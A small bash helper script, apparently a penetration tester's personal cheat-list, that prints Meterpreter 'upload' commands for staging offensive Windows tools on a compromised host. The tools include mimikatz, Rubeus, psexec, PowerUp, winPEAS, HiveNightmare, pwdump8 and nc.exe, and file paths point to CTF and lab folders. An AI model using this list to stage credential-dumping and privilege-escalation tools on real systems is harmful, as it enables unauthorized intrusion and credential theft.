#!/bin/bash - 
#===============================================================================
#
#          FILE: upload-meterpreter.sh
# 
#         USAGE: ./upload-meterpreter.sh 
# 
#   DESCRIPTION: 
# 
#       OPTIONS: ---
#  REQUIREMENTS: ---
#          BUGS: ---
#         NOTES: ---
#        AUTHOR: Amit Agarwal (aka), 
#  ORGANIZATION: Individual
#       CREATED: 09/05/2021 11:41
#      REVISION:  ---
#===============================================================================

cat << EOF |grep -i $1
upload /root/amitag/windows-binaries/arch/windows/sysinternals-suite/psexec64.exe
upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
upload /root/amitag/windows-binaries/arch/windows/sysinternals-suite/psexec64.exe
upload /root/amitag/windows-binaries/powerview.ps1
upload /root/amitag/windows-binaries/Rubeus.exe
upload /root/amitag/windows-binaries/beRoot.exe
upload /root/amitag/windows-binaries/winPEASany.exe
upload /root/amitag/windows-binaries/winPEASx64.exe
upload /root/amitag/windows-binaries/powersploit/Privesc/PowerUp.ps1
upload /root/amitag/git/tools/Windows/HiveNightmare/Release/HiveNightmare.exe
upload /usr/share/windows-resources/binaries/nc.exe
upload /mnt/Dropbox/Win-Downloads/Hacking/tarasco/pwdump8.exe
upload /mnt/Dropbox/Win-Downloads/Hacking/PortQryV2.exe
upload ~/amitag/CTF/CyberRange/SharpRoast.exe
upload /root/amitag/git/tools/Windows/ADRecon/ADRecon.ps1
upload /root/amitag/git/tools/Recon/ADRecon/ADRecon.ps1
upload "/root/amitag/git/tools/Windows/Ghostpack-CompiledBinaries/dotnet v4.5 compiled binaries/Rubeus.exe"
upload /usr/share/kerberoast/GetUserSPNs.ps1
EOF
